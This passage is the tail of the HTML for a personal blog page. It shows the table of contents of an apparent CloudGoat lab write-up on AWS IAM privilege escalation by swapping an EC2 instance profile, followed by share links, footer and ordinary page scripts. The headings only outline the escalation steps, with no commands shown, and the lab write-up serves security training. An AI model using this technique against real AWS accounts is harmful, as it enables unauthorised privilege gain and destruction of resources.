Vector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prerequisites-for-EC2-Instance-Creation"><span class="toc-number">1.6.</span> <span class="toc-text">Prerequisites for EC2 Instance Creation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Subnet-Information"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. Subnet Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Security-Group-Configuration"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. Security Group Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH-Key-Pair-Creation"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. SSH Key Pair Creation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Creating-the-Exploitation-EC2-Instance"><span class="toc-number">1.7.</span> <span class="toc-text">Creating the Exploitation EC2 Instance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IAM-Role-Escalation-Through-Instance-Profile-Manipulation"><span class="toc-number">1.8.</span> <span class="toc-text">IAM Role Escalation Through Instance Profile Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Remove-the-Low-Privilege-Role"><span class="toc-number">1.8.1.</span> <span class="toc-text">Remove the Low-Privilege Role:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attach-the-High-Privilege-Role"><span class="toc-number">1.8.2.</span> <span class="toc-text">Attach the High-Privilege Role:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-the-Compromised-Instance"><span class="toc-number">1.9.</span> <span class="toc-text">Accessing the Compromised Instance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Set-proper-permissions-for-the-SSH-key"><span class="toc-number">1.9.1.</span> <span class="toc-text">1. Set proper permissions for the SSH key:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Retrieve-the-public-IP-address"><span class="toc-number">1.9.2.</span> <span class="toc-text">2. Retrieve the public IP address:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH-into-the-instance"><span class="toc-number">1.9.3.</span> <span class="toc-text">3. SSH into the instance:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Privilege-Verification-and-Target-Elimination"><span class="toc-number">1.10.</span> <span class="toc-text">Post-Exploitation: Privilege Verification and Target Elimination</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-the-Escalated-Privileges"><span class="toc-number">1.10.1.</span> <span class="toc-text">Enumerate the Escalated Privileges:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Completion-Target-Termination"><span class="toc-number">1.10.2.</span> <span class="toc-text">Mission Completion: Target Termination</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cleanup-and-Environment-Destruction"><span class="toc-number">1.11.</span> <span class="toc-text">Cleanup and Environment Destruction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Terminate-the-Exploitation-EC2-Instance"><span class="toc-number">1.11.1.</span> <span class="toc-text">1. Terminate the Exploitation EC2 Instance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Destroy-the-CloudGoat-Environment"><span class="toc-number">1.11.2.</span> <span class="toc-text">2. Destroy the CloudGoat Environment</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&text=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&is_video=false&description=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CloudGoat-Iam_Privesc_By_Attachment&body=Check out this article: https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&name=CloudGoat-Iam_Privesc_By_Attachment&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&t=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
